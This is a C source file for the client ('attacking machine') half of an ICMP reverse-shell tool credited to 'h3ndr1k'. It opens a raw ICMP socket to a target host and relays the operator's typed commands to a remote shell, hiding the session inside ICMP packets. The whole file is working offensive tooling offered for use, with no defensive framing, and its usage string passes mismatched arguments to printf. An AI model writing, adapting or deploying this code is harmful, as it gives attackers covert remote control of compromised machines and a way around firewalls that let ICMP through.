/*
 * reverse-icmp-shell: client
 *
 * by: h3ndr1k
 * Inspirated by code from Peter Kieltyka (elux)
 * http://peter.eluks.com / peter@eluks.com
 *
 */

#include "header.h"

/* function prototypes */
void    usage(char *);
void    ish_timeout(int);
int     ish_prompt(int, struct sockaddr *, socklen_t);

void
usage(char *program) {
    fprintf(stderr,
    "\nICMP reverse-shell (attacking machine)   -   by: h3ndr1k\nInspirated by code from Peter Kieltyka (elux)\n"
    "usage: %s [options] <host>\n\n"
    "options:\n"
    " -i <id>          Set session id; range: 0-65535 (default: 1515)\n"
    " -t <type>        Set ICMP type (default: 0)\n"
    " -p <packetsize>  Set packet size (default: 512)\n"
    "\nexample:\n"
    "%s -i 65535 -t 0 -p 1024 [host]\n"
    "\n", VERSION, program, program );

    exit(-1);
}

void
ish_timeout(int empty) {
    printf("failed.\n\n");
    exit(-1);
}

int
ish_prompt(int sockfd, struct sockaddr *sin, socklen_t sinlen) {
    fd_set  rset;
    int     n, maxfd;
    char    send_buf[ish_info.packetsize], recv_buf[ish_info.packetsize];

    while(1) {
        FD_ZERO(&rset);

        FD_SET(STDIN_FILENO, &rset);
        FD_SET(sockfd, &rset);
        maxfd = MAX(STDIN_FILENO, sockfd) + 1;

        select(maxfd, &rset, NULL, NULL, NULL);

        if(FD_ISSET(sockfd, &rset)) {
            memset(recv_buf, 0, sizeof(recv_buf));
            n = ish_recv(sockfd, recv_buf, sin, sinlen);

            if(n == 0)
                fprintf(stdout, "%s", recv_buf);
            else if(n == CNTRL_CEXIT)
                exit(0);
        }
        printf("#");
        if(FD_ISSET(STDIN_FILENO, &rset)) {
            memset(send_buf, 0, sizeof(send_buf));
            read(STDIN_FILENO, send_buf, sizeof(send_buf));

            if(ish_send(sockfd, send_buf, sin, sinlen) < 0){}

        }
    }
}

int
main(int argc, char *argv[]) {
    int     sockfd;
    char    *host, opt;
    struct  sockaddr_in sin;
    struct  hostent *he;

    if(argc < 2)
        usage(argv[0]);

    while((opt = getopt(argc, argv, "i:t:p:")) != -1) {
        switch(opt) {
        	case 'i':
            	ish_info.id = atoi(optarg);
            	break;
        	case 't':
            	ish_info.type = atoi(optarg);
            	break;
        	case 'p':
            	ish_info.packetsize = atoi(optarg);
            	break;
        	default:
            	usage(argv[0]);
            	break;
        }
    }
    host = argv[argc-1];

    //check if the host can be resolved
    if((he = gethostbyname(host)) == NULL) {
        fprintf(stderr, "Error: Cannot resolve %s!\n", host);
        exit(-1);
    }

    //do some socket magic??
    sin.sin_family = AF_INET;
    sin.sin_addr = *((struct in_addr *)he->h_addr);
    memset(&(sin.sin_zero), 0, 8);

    if((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1){}

    sendhdr.cntrl = 0;
    sendhdr.cntrl |= CNTRL_CPOUT;

    printf("\nICMP reverse-shell v%s  (attacking machine)   -   by: h3ndr1k\nInspirated by code from Peter Kieltyka (elux)\n", VERSION);
    printf("\n--------------------------------------------------\n");
    printf("\nConnecting to %s...\nWhen you see appending '#' just press enter to connect to your shell.\n", host);

    setvbuf(stdout, NULL, _IONBF, 0);
    fflush(stdout);

    ish_prompt(sockfd, (struct sockaddr *)&sin, sizeof(sin));

    close(sockfd);
    exit(0);
}

